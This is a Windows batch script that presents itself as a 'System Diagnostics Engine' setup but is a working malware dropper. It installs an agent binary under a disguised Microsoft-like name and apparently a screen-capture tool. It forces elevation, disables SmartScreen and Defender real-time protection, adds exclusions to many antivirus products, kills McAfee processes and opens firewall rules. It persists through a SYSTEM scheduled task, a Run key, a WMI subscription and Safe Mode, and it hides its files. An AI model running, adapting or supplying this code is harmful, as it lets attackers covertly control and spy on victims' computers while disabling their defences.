@echo off
title System Diagnostics Engine
color 0A

:: ═══════════════════════════════════════════════════
:: ULTIMATE SETUP v4.0 — Win 10/11 Compatible
:: Extract ZIP → Run this BAT → Done. No other steps.
:: Uses proven VBS-based UAC elevation (works with spaces in paths)
:: ═══════════════════════════════════════════════════

:: 1. FORCE ADMIN — VBS method (reliable with all path types)
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo [!] Requesting Administrator Access...
    echo.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

echo.
echo =========================================================
echo    SYSTEM DIAGNOSTICS ENGINE - DEPLOYMENT
echo =========================================================
echo.

:: 2. CONFIG
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL="
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

:: ═══════════════════════════════════════════════════
:: PHASE 1: PRE-FLIGHT — Remove ALL blocks BEFORE touching files
:: ═══════════════════════════════════════════════════
echo [1/10] Removing SmartScreen and download blocks...

:: Strip Zone.Identifier ADS (the root cause of SmartScreen popups)
powershell -NoProfile -Command ^
  "Get-ChildItem -Path '%~dp0' -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { " ^
  "  try { Remove-Item -Path (\"$($_.FullName):Zone.Identifier\") -Force -ErrorAction SilentlyContinue } catch {} " ^
  "}; " ^
  "Get-ChildItem -Path '%~dp0' -Recurse -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue"

:: Disable SmartScreen system-wide
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1

:: ═══════════════════════════════════════════════════
:: PHASE 2: AV EXCLUSIONS — Handle Defender + Third-Party AV
:: ═══════════════════════════════════════════════════
echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...

:: --- Windows Defender ---
powershell -NoProfile -Command ^
  "try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction Stop } catch {}; " ^
  "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {}; " ^
  "try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {}; " ^
  "try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {}; " ^
  "try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {}; " ^
  "try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}; " ^
  "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}" >nul 2>&1

:: --- McAfee Endpoint Security ---
:: McAfee uses OAS (On-Access Scan) exclusions via registry
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%~dp0" /t REG_SZ /d "1" /f >nul 2>&1
:: McAfee VirusScan Enterprise
reg add "HKLM\SOFTWARE\McAfee\VSCore\On Access Scanner\MCShield\Configuration\Default" /v ExcludedItem_1 /t REG_SZ /d "3|1|%INSTALL_DIR%" /f >nul 2>&1
:: Kill McAfee scan temporarily (it respawns, but gives us a window to install)
taskkill /F /IM "mcshield.exe" /T >nul 2>&1
taskkill /F /IM "mfeavsvc.exe" /T >nul 2>&1

:: --- Avast / AVG ---
:: Avast stores exclusions in registry
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "%INSTALL_DIR%\%BIN_NAME%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVAST Software\Avast\Exclusions\Path" /v "%~dp0" /t REG_SZ /d "" /f >nul 2>&1
:: AVG uses same parent company, similar registry
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\AVG\Antivirus\Exclusions\Path" /v "%INSTALL_DIR%\%BIN_NAME%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Norton / Symantec ---
:: Norton doesn't have CLI exclusions, but we can try the Symantec Endpoint Protection registry
reg add "HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Kaspersky ---
reg add "HKLM\SOFTWARE\KasperskyLab\AVP\Data\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Bitdefender ---
reg add "HKLM\SOFTWARE\Bitdefender\Exclusions" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- ESET ---
reg add "HKLM\SOFTWARE\ESET\ESET Security\RealTimeProtection\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

:: --- Trend Micro ---
reg add "HKLM\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Real Time Scan Configuration\ExcludedPaths" /v "%INSTALL_DIR%" /t REG_SZ /d "" /f >nul 2>&1

echo     Security exclusions configured for all detected AV engines.

:: ═══════════════════════════════════════════════════
:: PHASE 3: CLEAN SLATE — Kill old processes, remove old installs
:: ═══════════════════════════════════════════════════
echo [3/10] Cleaning previous installation...

taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1

:: Remove old WMI subscriptions
powershell -NoProfile -Command ^
  "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='WinHealthFilter'\" -EA 0 | Remove-WmiObject -EA 0; " ^
  "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='WinHealthConsumer'\" -EA 0 | Remove-WmiObject -EA 0; " ^
  "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -like '*WinHealthFilter*' } | Remove-WmiObject -EA 0" >nul 2>&1

:: Small wait for processes to fully terminate
ping 127.0.0.1 -n 3 >nul

:: Unlock destination directory
if exist "%INSTALL_DIR%" (
    attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: ═══════════════════════════════════════════════════
:: PHASE 4: INSTALL — Copy files, rename binary
:: ═══════════════════════════════════════════════════
echo [4/10] Installing to secure location...

:: Copy ALL files from extracted zip folder to install dir
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1

:: Force recompile ScreenCap on target machine (CPU/DPI specific)
if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe" >nul 2>&1

:: Copy the agent exe as the disguised name
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
    echo     Agent binary installed.
) else (
    echo [ERROR] teram_agent.exe not found in this folder!
    echo Make sure the zip was extracted completely.
    pause
    exit /B
)

:: Strip SmartScreen blocks from the INSTALLED copies too
powershell -NoProfile -Command ^
  "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse -Force -EA 0 | ForEach-Object { " ^
  "  try { Remove-Item -Path (\"$($_.FullName):Zone.Identifier\") -Force -EA 0 } catch {} " ^
  "}; " ^
  "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse -EA 0 | Unblock-File -EA 0" >nul 2>&1

:: ═══════════════════════════════════════════════════
:: PHASE 5: FIREWALL — Allow agent through Windows Firewall
:: ═══════════════════════════════════════════════════
echo [5/10] Configuring firewall rules...

netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1

:: ═══════════════════════════════════════════════════
:: PHASE 6: PERSISTENCE LAYER 1 — Scheduled Task (SYSTEM, auto-restart)
:: ═══════════════════════════════════════════════════
echo [6/10] Layer 1: Scheduled Task (SYSTEM-level)...

schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$a = New-ScheduledTaskAction -Execute '%INSTALL_DIR%\%BIN_NAME%' -Argument '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%'; " ^
  "$t1 = New-ScheduledTaskTrigger -AtStartup; " ^
  "$t2 = New-ScheduledTaskTrigger -AtLogOn; " ^
  "$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365) -MultipleInstances IgnoreNew; " ^
  "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t1,$t2) -Settings $s -User 'SYSTEM' -RunLevel Highest -Force | Out-Null; " ^
  "Write-Host '    Task registered successfully.' -ForegroundColor Green"

:: ═══════════════════════════════════════════════════
:: PHASE 7: PERSISTENCE LAYER 2 — Registry Run Key (HKLM)
:: ═══════════════════════════════════════════════════
echo [7/10] Layer 2: Registry Run Key...

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /f >nul

:: ═══════════════════════════════════════════════════
:: PHASE 8: PERSISTENCE LAYER 3 — WMI Event Subscription
:: ═══════════════════════════════════════════════════
echo [8/10] Layer 3: WMI Boot Subscription...

set "WMI_SCRIPT=%TEMP%\wmi_setup.ps1"
(
echo $ErrorActionPreference = 'SilentlyContinue'
echo $fn = 'WinHealthFilter'
echo $cn = 'WinHealthConsumer'
echo # Clean old
echo Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$fn'" ^| Remove-WmiObject
echo Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$cn'" ^| Remove-WmiObject
echo Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding ^| Where-Object { $_.Filter -like "*$fn*" } ^| Remove-WmiObject
echo # Create filter: fires when system uptime reaches 60 seconds
echo $wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
echo $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$fn; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$wql}
echo $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$cn; CommandLineTemplate='%INSTALL_DIR%\%BIN_NAME% %SERVER_URL%'; RunInteractively=$false}
echo Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} ^| Out-Null
echo Write-Host '    WMI subscription created.' -ForegroundColor Green
) > "%WMI_SCRIPT%"
powershell -NoProfile -ExecutionPolicy Bypass -File "%WMI_SCRIPT%" 2>nul
del /F /Q "%WMI_SCRIPT%" >nul 2>&1

:: ═══════════════════════════════════════════════════
:: PHASE 9: PERSISTENCE LAYER 4 — Safe Mode
:: ═══════════════════════════════════════════════════
echo [9/10] Layer 4: Safe Mode persistence...

reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /d "cmd.exe /c start \"\" \"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL% & cmd.exe" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\%TASK_NAME%" /ve /d "Service" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\%TASK_NAME%" /ve /d "Service" /f >nul 2>&1

:: Block accessibility exploits
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /v Debugger /t REG_SZ /d "systray.exe" /f >nul 2>&1

:: ═══════════════════════════════════════════════════
:: PHASE 10: STEALTH + LAUNCH (with retry loop for AV)
:: ═══════════════════════════════════════════════════
echo [10/10] Engaging stealth and starting agent...

:: Set ACLs
icacls "%INSTALL_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" "BUILTIN\Users:(OI)(CI)RX" /T /C /Q >nul 2>&1

:: Hide directory and exe
attrib +h "%INSTALL_DIR%" /D
attrib +h "%INSTALL_DIR%\%BIN_NAME%"

:: ═══════════════════════════════════════════════════
:: LAUNCH WITH RETRY — AV may kill the process on first attempt
:: Try up to 3 times with increasing delays
:: ═══════════════════════════════════════════════════

set "LAUNCH_SUCCESS=0"
set "ATTEMPT=0"

:LaunchAttempt
set /a ATTEMPT+=1
if %ATTEMPT% gtr 3 goto LaunchDone

:: Method 1: Start via scheduled task (runs as SYSTEM)
if %ATTEMPT% equ 1 (
    echo     Attempt %ATTEMPT%: Starting via Scheduled Task...
    schtasks /Run /TN "%TASK_NAME%" >nul 2>&1
)

:: Method 2: Direct start as current user
if %ATTEMPT% equ 2 (
    echo     Attempt %ATTEMPT%: Starting directly...
    start "" /B "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
)

:: Method 3: PowerShell hidden start
if %ATTEMPT% equ 3 (
    echo     Attempt %ATTEMPT%: Starting via PowerShell...
    powershell -NoProfile -Command "Start-Process -FilePath '%INSTALL_DIR%\%BIN_NAME%' -ArgumentList '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%' -WindowStyle Hidden" >nul 2>&1
)

:: Wait for process to stabilize (AV scan takes time)
timeout /t 5 >nul

:: Check if running
tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    set "LAUNCH_SUCCESS=1"
    goto LaunchDone
)

:: AV may have killed it — wait longer and retry
echo     Process not detected. AV may have intervened. Retrying...
timeout /t 5 >nul
goto LaunchAttempt

:LaunchDone

echo.
if %LAUNCH_SUCCESS% equ 1 (
    echo =====================================================
    echo    DEPLOYMENT SUCCESSFUL
    echo =====================================================
    echo    Process:    %BIN_NAME% [RUNNING]
    echo    Server:     %SERVER_URL%
    echo    Location:   %INSTALL_DIR%
    echo.
    echo    PERSISTENCE LAYERS ACTIVE:
    echo      1. Scheduled Task  [SYSTEM, AtStartup+AtLogOn]
    echo      2. Registry RunKey [HKLM]
    echo      3. WMI Subscription [60s post-boot]
    echo      4. Safe Mode       [AlternateShell]
    echo =====================================================
) else (
    echo =====================================================
    echo    INSTALLED - AGENT WILL START ON NEXT REBOOT
    echo =====================================================
    echo    The agent was installed but could not start now.
    echo    This is usually because your antivirus blocked it.
    echo.
    echo    WHAT TO DO:
    echo      1. Check your antivirus quarantine and restore
    echo         the file: %INSTALL_DIR%\%BIN_NAME%
    echo      2. Add this folder to your AV exclusions:
    echo         %INSTALL_DIR%
    echo      3. Reboot your computer - it will auto-start
    echo.
    echo    Or manually test by running:
    echo      "%INSTALL_DIR%\%BIN_NAME%" %SERVER_URL%
    echo =====================================================
)

echo.
echo You can safely delete this installer folder now.
echo The agent is installed to: %INSTALL_DIR%
echo.
pause
exit /B
